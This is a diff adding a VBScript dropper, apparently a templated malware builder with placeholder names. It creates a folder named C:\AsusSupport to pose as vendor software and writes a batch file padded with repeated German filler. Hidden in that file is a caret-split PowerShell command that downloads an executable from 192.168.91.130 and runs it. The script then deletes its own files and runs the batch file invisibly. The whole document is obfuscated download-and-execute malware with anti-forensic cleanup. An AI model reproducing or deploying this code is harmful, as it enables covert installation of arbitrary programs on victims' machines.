@@ -1,0 +1,458 @@
+set aVAR1a=CreateObject("Scripting.FileSystemObject")
+
+If Not aVAR2a Then
+If Not aVAR3a Then
+
+If Not aVAR1a.FolderExists("c:\AsusSupport") Then
+If Not aVAR4a Then
+
+If Not aVAR5a Then
+If Not aVAR6a Then
+If Not aVAR7a Then
+
+aVAR1a.CreateFolder ("c:\AsusSupport")
+End If
+End If
+End If
+End If
+End If
+End If
+End If
+ne1 = (" Bete , das mit Da in Beziehung auf das über die Ver : bem Grafen Ben    ")
+ne2 = ("    Bete , das mit Da in Beziehung auf das über die Ver : bem Grafen Ben")
+ne3 = ("    ")
+ne4 = ("        Bete , das mit Da in Beziehung auf das über die Ver : bem Grafen Ben          ")
+ne5 = ("                             ")
+ne6 = ("        Bete , das mit Da in Beziehung auf das über die Ver : bem Grafen Ben                 ")
+ne7 = ("                                          ")
+ne8 = ("        Bete , das mit Da in Beziehung auf das über die Ver : bem Grafen Ben                                  ")
+ne9 = ("                                          ")
+ne10 = ("                                          ")
+ne11 = ("         Bete , das mit Da in Beziehung auf das über die Ver : bem Grafen Ben")
+ne12 = ("Bete , das mit Da in Beziehung auf das über die Ver : bem Grafen Ben")
+ne13 = ("Bete , das mit Da in Beziehung auf das über die Ver : bem Grafen Ben")
+ne14 = ("Bete , das mit Da in Beziehung auf das über die Ver : bem Grafen Ben")
+ne15 = ("                  ")
+ne16 = ("Bete , das mit Da in Beziehung auf das über die Ver : bem Grafen Ben")
+ne17 = ("Bete , das mit Da in Beziehung auf das über die Ver : bem Grafen Ben")
+ne18 = ("Bete , das mit Da in Beziehung auf das über die Ver : bem Grafen Ben")
+ne19 = ("                           ")
+ne20 = ("Bete , das mit Da in Beziehung auf das über die Ver : bem Grafen Ben")
+ne21 = ("Bete , das mit Da in Beziehung auf das über die Ver : bem Grafen Ben")
+ne22 = ("Bete , das mit Da in Beziehung auf das über die Ver : bem Grafen Ben")
+ne23 = ("Bete , das mit Da in Beziehung auf das über die Ver : bem Grafen Ben")
+
+
+
+
+
+Ferrryr = ("POW^")
+
+
+
+a2 = ("erS^")
+a3 = ("hell (""Ne""^")
+a4 = ("w-Ob^")
+a5 = ("jec^")
+a6 = ("t Ne^")
+a7 = ("t.WebC^")
+a8 = ("lient"")""^")
+a9 = (".""Dow""^")
+a10 = ("nlo^")
+a11 = ("adFi^")
+a12 = ("le""('""^")
+a15 = ("ht^")
+a16 = ("tp:^")
+a17 = ("/^")
+a18 = ("/^")
+a19 = ("192.168.91.130^")
+a20 = ("/^")
+a21 = ("Tcpview^")
+a22 = (".^")
+a23 = ("exe^")
+b16 = ("', 'C:\AsusSupport\aEXECMEa.exe')")
+b2 = ("C:\AsusSupport\aEXECMEa.exe")
+Wait = ("TIMEOUT /T 10 & DEL C:\ProgramData\aVBSNAMEa.vbs & DEL C:\AsusSupport\aCMDEXECa.cmd & DEL C:\ProgramData\aJUNKa")
+
+
+Set aVAR8a = aVAR1a.OpenTextFile("C:\AsusSupport\aCMDEXECa.cmd" & c, 8, True)
+aVAR8a.WriteLine ne1
+aVAR8a.WriteLine ne2
+aVAR8a.WriteLine ne3
+aVAR8a.WriteLine ne4
+aVAR8a.WriteLine ne5
+aVAR8a.WriteLine ne6
+aVAR8a.WriteLine ne7
+aVAR8a.WriteLine ne8
+aVAR8a.WriteLine ne9
+aVAR8a.WriteLine ne10
+aVAR8a.WriteLine ne11
+aVAR8a.WriteLine ne12
+aVAR8a.WriteLine ne13
+aVAR8a.WriteLine ne14
+aVAR8a.WriteLine ne15
+aVAR8a.WriteLine ne16
+aVAR8a.WriteLine ne17
+aVAR8a.WriteLine ne18
+aVAR8a.WriteLine ne19
+aVAR8a.WriteLine ne20
+aVAR8a.WriteLine ne21
+aVAR8a.WriteLine ne22
+aVAR8a.WriteLine ne23
+aVAR8a.WriteLine ne1
+aVAR8a.WriteLine ne2
+aVAR8a.WriteLine ne3
+aVAR8a.WriteLine ne4
+aVAR8a.WriteLine ne5
+aVAR8a.WriteLine ne6
+aVAR8a.WriteLine ne7
+aVAR8a.WriteLine ne8
+aVAR8a.WriteLine ne9
+aVAR8a.WriteLine ne10
+aVAR8a.WriteLine ne11
+aVAR8a.WriteLine ne12
+aVAR8a.WriteLine ne13
+aVAR8a.WriteLine ne14
+aVAR8a.WriteLine ne15
+aVAR8a.WriteLine ne16
+aVAR8a.WriteLine ne17
+aVAR8a.WriteLine ne18
+aVAR8a.WriteLine ne19
+aVAR8a.WriteLine ne20
+aVAR8a.WriteLine ne21
+aVAR8a.WriteLine ne22
+aVAR8a.WriteLine ne23
+aVAR8a.WriteLine ne1
+aVAR8a.WriteLine ne2
+aVAR8a.WriteLine ne3
+aVAR8a.WriteLine ne4
+aVAR8a.WriteLine ne5
+aVAR8a.WriteLine ne6
+aVAR8a.WriteLine ne7
+aVAR8a.WriteLine ne8
+aVAR8a.WriteLine ne9
+aVAR8a.WriteLine ne10
+aVAR8a.WriteLine ne11
+aVAR8a.WriteLine ne12
+aVAR8a.WriteLine ne13
+aVAR8a.WriteLine ne14
+aVAR8a.WriteLine ne15
+aVAR8a.WriteLine ne16
+aVAR8a.WriteLine ne17
+aVAR8a.WriteLine ne18
+aVAR8a.WriteLine ne19
+aVAR8a.WriteLine ne20
+aVAR8a.WriteLine ne21
+aVAR8a.WriteLine ne22
+aVAR8a.WriteLine ne23
+aVAR8a.WriteLine ne1
+aVAR8a.WriteLine ne2
+aVAR8a.WriteLine ne3
+aVAR8a.WriteLine ne4
+aVAR8a.WriteLine ne5
+aVAR8a.WriteLine ne6
+aVAR8a.WriteLine ne7
+aVAR8a.WriteLine ne8
+aVAR8a.WriteLine ne9
+aVAR8a.WriteLine ne10
+aVAR8a.WriteLine ne11
+aVAR8a.WriteLine ne12
+aVAR8a.WriteLine ne13
+aVAR8a.WriteLine ne14
+aVAR8a.WriteLine ne15
+aVAR8a.WriteLine ne16
+aVAR8a.WriteLine ne17
+aVAR8a.WriteLine ne18
+aVAR8a.WriteLine ne19
+aVAR8a.WriteLine ne20
+aVAR8a.WriteLine ne21
+aVAR8a.WriteLine ne22
+aVAR8a.WriteLine ne23
+aVAR8a.WriteLine ne1
+aVAR8a.WriteLine ne2
+aVAR8a.WriteLine ne3
+aVAR8a.WriteLine ne4
+aVAR8a.WriteLine ne5
+aVAR8a.WriteLine ne6
+aVAR8a.WriteLine ne7
+aVAR8a.WriteLine ne8
+aVAR8a.WriteLine ne9
+aVAR8a.WriteLine ne10
+aVAR8a.WriteLine ne11
+aVAR8a.WriteLine ne12
+aVAR8a.WriteLine ne13
+aVAR8a.WriteLine ne14
+aVAR8a.WriteLine ne15
+aVAR8a.WriteLine ne16
+aVAR8a.WriteLine ne17
+aVAR8a.WriteLine ne18
+aVAR8a.WriteLine ne19
+aVAR8a.WriteLine ne20
+aVAR8a.WriteLine ne21
+aVAR8a.WriteLine ne22
+aVAR8a.WriteLine ne23
+aVAR8a.WriteLine ne1
+aVAR8a.WriteLine ne2
+aVAR8a.WriteLine ne3
+aVAR8a.WriteLine ne4
+aVAR8a.WriteLine ne5
+aVAR8a.WriteLine ne6
+aVAR8a.WriteLine ne7
+aVAR8a.WriteLine ne8
+aVAR8a.WriteLine ne9
+aVAR8a.WriteLine ne10
+aVAR8a.WriteLine ne11
+aVAR8a.WriteLine ne12
+aVAR8a.WriteLine ne13
+aVAR8a.WriteLine ne14
+aVAR8a.WriteLine ne15
+aVAR8a.WriteLine ne16
+aVAR8a.WriteLine ne17
+aVAR8a.WriteLine ne18
+aVAR8a.WriteLine ne19
+aVAR8a.WriteLine ne20
+aVAR8a.WriteLine ne21
+aVAR8a.WriteLine ne22
+aVAR8a.WriteLine ne23
+aVAR8a.WriteLine ne1
+aVAR8a.WriteLine ne2
+aVAR8a.WriteLine ne3
+aVAR8a.WriteLine ne4
+aVAR8a.WriteLine ne5
+aVAR8a.WriteLine ne6
+aVAR8a.WriteLine ne7
+aVAR8a.WriteLine ne8
+aVAR8a.WriteLine ne9
+aVAR8a.WriteLine ne10
+aVAR8a.WriteLine ne11
+aVAR8a.WriteLine ne12
+aVAR8a.WriteLine ne13
+aVAR8a.WriteLine ne14
+aVAR8a.WriteLine ne15
+aVAR8a.WriteLine ne16
+aVAR8a.WriteLine ne17
+aVAR8a.WriteLine ne18
+aVAR8a.WriteLine ne19
+aVAR8a.WriteLine ne20
+aVAR8a.WriteLine ne21
+aVAR8a.WriteLine ne22
+aVAR8a.WriteLine ne23
+aVAR8a.WriteLine ne1
+aVAR8a.WriteLine ne2
+aVAR8a.WriteLine ne3
+aVAR8a.WriteLine ne4
+aVAR8a.WriteLine ne5
+aVAR8a.WriteLine ne6
+aVAR8a.WriteLine ne7
+aVAR8a.WriteLine ne8
+aVAR8a.WriteLine ne9
+aVAR8a.WriteLine ne10
+aVAR8a.WriteLine ne11
+aVAR8a.WriteLine ne12
+aVAR8a.WriteLine ne13
+aVAR8a.WriteLine ne14
+aVAR8a.WriteLine ne15
+aVAR8a.WriteLine ne16
+aVAR8a.WriteLine ne17
+aVAR8a.WriteLine ne18
+aVAR8a.WriteLine ne19
+aVAR8a.WriteLine ne20
+aVAR8a.WriteLine ne21
+aVAR8a.WriteLine ne22
+aVAR8a.WriteLine ne23
+aVAR8a.WriteLine ne1
+aVAR8a.WriteLine ne2
+aVAR8a.WriteLine ne3
+aVAR8a.WriteLine ne4
+aVAR8a.WriteLine ne5
+aVAR8a.WriteLine ne6
+aVAR8a.WriteLine ne7
+aVAR8a.WriteLine ne8
+aVAR8a.WriteLine ne9
+aVAR8a.WriteLine ne10
+aVAR8a.WriteLine ne11
+aVAR8a.WriteLine ne12
+aVAR8a.WriteLine ne13
+aVAR8a.WriteLine ne14
+aVAR8a.WriteLine ne15
+aVAR8a.WriteLine ne16
+aVAR8a.WriteLine ne17
+aVAR8a.WriteLine ne18
+aVAR8a.WriteLine ne19
+aVAR8a.WriteLine ne20
+aVAR8a.WriteLine ne21
+aVAR8a.WriteLine ne22
+aVAR8a.WriteLine ne23
+aVAR8a.WriteLine ne1
+aVAR8a.WriteLine ne2
+aVAR8a.WriteLine ne3
+aVAR8a.WriteLine ne4
+aVAR8a.WriteLine ne5
+aVAR8a.WriteLine ne6
+aVAR8a.WriteLine ne7
+aVAR8a.WriteLine ne8
+aVAR8a.WriteLine ne9
+aVAR8a.WriteLine ne10
+aVAR8a.WriteLine ne11
+aVAR8a.WriteLine ne12
+aVAR8a.WriteLine ne13
+aVAR8a.WriteLine ne14
+aVAR8a.WriteLine ne15
+aVAR8a.WriteLine ne16
+aVAR8a.WriteLine ne17
+aVAR8a.WriteLine ne18
+aVAR8a.WriteLine ne19
+aVAR8a.WriteLine ne20
+aVAR8a.WriteLine ne21
+aVAR8a.WriteLine ne22
+aVAR8a.WriteLine ne23
+aVAR8a.WriteLine ne1
+aVAR8a.WriteLine ne2
+aVAR8a.WriteLine ne3
+aVAR8a.WriteLine ne4
+aVAR8a.WriteLine ne5
+aVAR8a.WriteLine ne6
+aVAR8a.WriteLine ne7
+aVAR8a.WriteLine ne8
+aVAR8a.WriteLine ne9
+aVAR8a.WriteLine ne10
+aVAR8a.WriteLine ne11
+aVAR8a.WriteLine ne12
+aVAR8a.WriteLine ne13
+aVAR8a.WriteLine ne14
+aVAR8a.WriteLine ne15
+aVAR8a.WriteLine ne16
+aVAR8a.WriteLine ne17
+aVAR8a.WriteLine ne18
+aVAR8a.WriteLine ne19
+aVAR8a.WriteLine ne20
+aVAR8a.WriteLine ne21
+aVAR8a.WriteLine ne22
+aVAR8a.WriteLine ne23
+aVAR8a.WriteLine ne1
+aVAR8a.WriteLine ne2
+aVAR8a.WriteLine ne3
+aVAR8a.WriteLine ne4
+aVAR8a.WriteLine ne5
+aVAR8a.WriteLine ne6
+aVAR8a.WriteLine ne7
+aVAR8a.WriteLine ne8
+aVAR8a.WriteLine ne9
+aVAR8a.WriteLine ne10
+aVAR8a.WriteLine ne11
+aVAR8a.WriteLine ne12
+aVAR8a.WriteLine ne13
+aVAR8a.WriteLine ne14
+aVAR8a.WriteLine ne15
+aVAR8a.WriteLine ne16
+aVAR8a.WriteLine ne17
+aVAR8a.WriteLine ne18
+aVAR8a.WriteLine ne19
+aVAR8a.WriteLine ne20
+aVAR8a.WriteLine ne21
+aVAR8a.WriteLine ne22
+aVAR8a.WriteLine ne23
+aVAR8a.WriteLine ne1
+aVAR8a.WriteLine ne2
+aVAR8a.WriteLine ne3
+aVAR8a.WriteLine ne4
+aVAR8a.WriteLine ne5
+aVAR8a.WriteLine ne6
+aVAR8a.WriteLine ne7
+aVAR8a.WriteLine ne8
+aVAR8a.WriteLine ne9
+aVAR8a.WriteLine ne10
+aVAR8a.WriteLine ne11
+aVAR8a.WriteLine ne12
+aVAR8a.WriteLine ne13
+aVAR8a.WriteLine ne14
+aVAR8a.WriteLine ne15
+aVAR8a.WriteLine ne16
+aVAR8a.WriteLine ne17
+aVAR8a.WriteLine ne18
+aVAR8a.WriteLine ne19
+aVAR8a.WriteLine ne20
+aVAR8a.WriteLine ne21
+aVAR8a.WriteLine ne22
+aVAR8a.WriteLine ne23
+aVAR8a.WriteLine a0
+aVAR8a.WriteLine Ferrryr
+aVAR8a.WriteLine a2
+aVAR8a.WriteLine a3
+aVAR8a.WriteLine a4
+aVAR8a.WriteLine a5
+aVAR8a.WriteLine a6
+aVAR8a.WriteLine a7
+aVAR8a.WriteLine a8
+aVAR8a.WriteLine a9
+aVAR8a.WriteLine a10
+aVAR8a.WriteLine a11
+aVAR8a.WriteLine a12
+aVAR8a.WriteLine a15
+aVAR8a.WriteLine a16
+aVAR8a.WriteLine a17
+aVAR8a.WriteLine a18
+aVAR8a.WriteLine a19
+aVAR8a.WriteLine a20
+aVAR8a.WriteLine a21
+aVAR8a.WriteLine a22
+aVAR8a.WriteLine a23
+aVAR8a.WriteLine b16
+aVAR8a.WriteLine b2
+aVAR8a.WriteLine ne1
+aVAR8a.WriteLine ne2
+aVAR8a.WriteLine ne3
+aVAR8a.WriteLine ne4
+aVAR8a.WriteLine ne5
+aVAR8a.WriteLine ne6
+aVAR8a.WriteLine ne7
+aVAR8a.WriteLine ne8
+aVAR8a.WriteLine ne9
+aVAR8a.WriteLine ne10
+aVAR8a.WriteLine ne11
+aVAR8a.WriteLine ne12
+aVAR8a.WriteLine ne13
+aVAR8a.WriteLine ne14
+aVAR8a.WriteLine ne15
+aVAR8a.WriteLine ne16
+aVAR8a.WriteLine ne17
+aVAR8a.WriteLine ne18
+aVAR8a.WriteLine ne19
+aVAR8a.WriteLine ne20
+aVAR8a.WriteLine ne21
+aVAR8a.WriteLine ne22
+aVAR8a.WriteLine ne23
+aVAR8a.WriteLine Wait
+aVAR8a.WriteLine ne1
+aVAR8a.WriteLine ne2
+aVAR8a.WriteLine ne3
+aVAR8a.WriteLine ne4
+aVAR8a.WriteLine ne5
+aVAR8a.WriteLine ne6
+aVAR8a.WriteLine ne7
+aVAR8a.WriteLine ne8
+aVAR8a.WriteLine ne9
+aVAR8a.WriteLine ne10
+aVAR8a.WriteLine ne11
+aVAR8a.WriteLine ne12
+aVAR8a.WriteLine ne13
+aVAR8a.WriteLine ne14
+aVAR8a.WriteLine ne15
+aVAR8a.WriteLine ne16
+aVAR8a.WriteLine ne17
+aVAR8a.WriteLine ne18
+aVAR8a.WriteLine ne19
+aVAR8a.WriteLine ne20
+aVAR8a.WriteLine ne21
+aVAR8a.WriteLine ne22
+aVAR8a.WriteLine ne23
+aVAR8a.close
+
+Dim oShell : Set oShell = CreateObject("WScript.Shell")
+
+
+WScript.Sleep 7000
+
+
+oShell.Run "C:\AsusSupport\aCMDEXECa.cmd", 0, 0
+Set WshShell = Nothing
